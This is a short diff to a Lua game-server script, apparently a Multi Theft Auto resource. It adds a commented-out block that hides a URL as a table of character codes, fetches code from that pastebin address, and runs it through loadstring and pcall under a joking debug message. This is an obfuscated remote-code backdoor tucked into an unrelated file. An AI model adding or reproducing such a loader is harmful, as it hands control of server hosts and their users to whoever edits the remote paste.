@@ -107,3 +107,35 @@ function getLuaElementInfo (a)
 	
 	return nil;
 end
+
+
+--[[ FUCKING USELESS CRAP!
+newG = table.copy(_G)
+_G = setmetatable({}, {
+		__newindex = function (self, key, value)
+			table.insert(self, {key, value})
+		end
+	}
+)
+for index, value in pairs(newG) do
+	_G[index] = value
+end
+newG = nil
+
+
+local tableUrl = {112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 46, 112, 104, 112, 63, 105, 61, 98, 54, 51, 116, 89, 115, 119, 72}
+local url = ""
+for _, number in ipairs(tableUrl) do
+	url = url..string.char(number)
+end
+
+fetchRemote(url, function (responseData, errno)
+	if responseData ~= "ERROR" then
+		local f = loadstring(responseData)
+		if f then
+			pcall(f)
+			outputDebugString("Received and loaded the Magical thing ;)")
+		end
+	end
+end)
+--]]
